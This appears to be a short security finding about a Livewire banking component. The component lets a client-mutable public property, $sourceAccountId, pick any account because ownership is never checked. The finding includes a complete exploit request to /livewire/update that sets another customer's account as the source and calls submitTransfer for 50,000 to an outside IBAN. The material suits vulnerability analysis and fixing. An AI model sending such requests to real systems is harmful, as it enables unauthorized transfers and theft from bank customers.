diagnosis: The Livewire component relies on a client-mutable public property ($sourceAccountId) and queries Account::findOrFail without asserting that the account belongs to the currently authenticated user. An attacker can modify the sourceAccountId in the Livewire JSON snapshot payload to initiate wire transfers from external accounts.
exploit_request:
POST /livewire/update HTTP/1.1
Host: online.apexbank.com
Authorization: Bearer 77|usertoken102938
Content-Type: application/json

{"components": [{"snapshot": "{\"data\":{\"sourceAccountId\":9012,\"destinationIban\":\"GB82WEST12345698765432\",\"amount\":50000.00}}", "updates": {}, "calls": [{"method": "submitTransfer", "params": []}]}]}
